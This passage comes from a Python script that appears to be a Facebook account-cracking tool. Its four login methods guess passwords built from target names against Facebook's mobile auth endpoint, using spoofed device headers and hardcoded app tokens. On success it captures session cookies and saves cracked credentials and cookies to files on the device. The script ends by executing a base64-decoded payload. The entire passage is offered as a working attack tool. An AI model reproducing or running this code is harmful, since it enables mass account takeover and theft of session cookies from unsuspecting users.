                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": uid,
                    "password": pw,
                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': R_UA(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m [𝐎𝐏𝐓𝐗\033[1;92m] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    #print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{cok}');line()
                    ok.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗-𝐎𝐊.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐂𝐎𝐎𝐊𝐈𝐄𝐒.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m [𝐎𝐏𝐓𝐗-𝐂𝐏] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/𝐇𝐄𝐱𝐗_𝐌𝟏_𝐂𝐏.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method1(uid,nm,pwx)
        except Exception as e:
            self.method1(uid,nm,pwx)
#####_____________method2_________#####
    def method2(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write(f'\r\r\033[1;31m [\033[1;32m{date}\033[1;31m]\033[97;1m-\033[91;1m[\x1b[38;5;38m%s\033[91;1m]\033[97;1m-\033[91;1m[\033[92;1mOK:-%s\033[91;1m]\033[97;1m-\033[91;1m[CP:-%s]\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "register_api",
                        "email": uid,
                        "password": pw,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_US",
                        "client_country_code": "US",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': R_UA(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': f'{SEX}',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Connection-Quality': f'{SEX}',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[𝐎𝐏𝐓𝐗\033[1;92m] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{cok}');line()
                    ok.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗-𝐎𝐊.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐂𝐎𝐎𝐊𝐈𝐄𝐒.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[𝐎𝐏𝐓𝐗-𝐂𝐏] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐌𝟐_𝐂𝐏.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method2(uid,nm,pwx)
        except Exception as e:
            self.method2(uid,nm,pwx)
#####______________mtha3_________________##########
    def method3(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write(f'\r\r\033[1;31m [\033[1;32m{date}\033[1;31m]\033[97;1m-\033[91;1m[\x1b[38;5;38m%s\033[91;1m]\033[97;1m-\033[91;1m[\033[92;1m𝐎𝐊:-%s\033[91;1m]\033[97;1m-\033[91;1m[𝐂𝐏:-%s]\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data =  {'adid': str(uuid.uuid4()),
                         'email': uid,
                         'password': pw,
                         'cpl': 'true',
                         'credentials_type': 'password',
                         'error_detail_type': 'button_with_disabled',
                         'source': 'register_api',
                         'format': 'json',
                         'device_id': str(uuid.uuid4()),
                         'family_device_id': str(uuid.uuid4()),
                         'generate_session_cookies': '1',
                         'generate_analytics_claim': '1',
                         'generate_machine_id': '1',
                         'tier': 'regular',
                         'device': 'null',
                         'os_ver': '8.1',
                         'carrier': 'Telenor',
                         'app_id': '350685531728',
                         'app_ver': '918.892.73.972.912',
                         'locale': 'en_US',
                         'advertising_id': str(uuid.uuid4()),
                         'fb_api_req_friendly_name': 'authenticate'}
                headers = {'User-Agent': R_UA(),
                              'Accept-Encoding': 'gzip, deflate',
                              'Accept': '*/*', 'connection': 'keep-alive',
                              'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                              'x-fb-connection-bandwidth': '25718666',
                              'x-fb-sim-hni': '38280',
                              'x-fb-net-hni': '30369',
                              'X-FB-Connection-Quality': 'GOOD',
                              'X-FB-Connection-Type': 'unknown',
                              'content-encoding': 'gzip,deflate',
                              'content-type': 'application/x-www-form-urlencoded',
                              'x-fb-http-engine': 'Liger',
                              'Content-Length': '566'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[𝐎𝐏𝐓𝐗\033[1;92m] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{cok}');line()
                    ok.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐎𝐊.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐂𝐎𝐎𝐊𝐈𝐄𝐒.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[𝐎𝐏𝐓𝐗-𝐎𝐊] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐌𝟑_𝐂𝐏.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method3(uid,nm,pwx)
        except Exception as e:
            self.method3(uid,nm,pwx)   
#####_____________method4_________#####
    def method4(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write(f'\r\r\033[1;31m [\033[1;32m{date}\033[1;31m]\033[97;1m-\033[91;1m[\x1b[38;5;38m%s\033[91;1m]\033[97;1m-\033[91;1m[\033[92;1m𝐎𝐊:-%s\033[91;1m]\033[97;1m-\033[91;1m[𝐂𝐏:-%s]\033[97;1m '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "register_api",
                        "email": uid,
                        "password": pw,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_US",
                        "client_country_code": "US",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': R_UA(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': f'{SEX}',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Connection-Quality': f'{SEX}',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'x-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
                if "session_key" in q:
                    print('\r\033[1;92m[𝐎𝐏𝐓𝐗\033[1;92m] %s | %s \033[1;97m '%(uid,pw))
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    cok = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={cok};{ckkk}"
                    print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{cok}');line()
                    ok.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗-𝐎𝐊.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐂𝐎𝐎𝐊𝐈𝐄𝐒.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print('\r\033[1;91m[𝐎𝐏𝐓𝐗-𝐂𝐏] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/𝐎𝐏𝐓𝐗_𝐌𝟒_𝐂𝐏.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.method4(uid,nm,pwx)
        except Exception as e:
            self.method4(uid,nm,pwx)         

#######___________________Name_____________#######
class Grep:
    def __init__(self):
        self.url = "https://free.facebook.com"
    def with_names(self):
        clear()
        logo()
        lines=[]
        p(" [•] [•] 𝐄𝐱 : /sdcard/file.txt")
        try:
            file = input(" [•] 𝐏𝐮𝐭 𝐅𝐢𝐥𝐞 𝐏𝐚𝐭𝐡 : ")
        except Exception as e:
            print(" [•] 𝐅𝐢𝐥𝐞 𝐏𝐚𝐭𝐡 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭‼️ ");sp(2);self.used_cutter()
        digit= int(input(" [•] 𝐏𝐮𝐭 𝐋𝐢𝐧𝐞 𝐍𝐮𝐦 :"))
        with open(file,"r") as r:
            lines = r.readlines()
        with open(file,"w") as w:
            for num,line in enumerate(lines):
                if num >= digit:
                    w.write(line)
        p(" [•] 𝐅𝐢𝐥𝐞 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞")
        input(" [•] 𝐏𝐫𝐞𝐬𝐬 𝐄𝐧𝐭𝐞𝐫 𝐭𝐨 𝐠𝐨 𝐛𝐚𝐜𝐤 ")
        iAmMain().iAmMenu()

if __name__ == "__main__":
    iAmMain().iAmMenu()
            
##########________END__________#########'
exec(B.b64decode(C).decode('utf-8'))
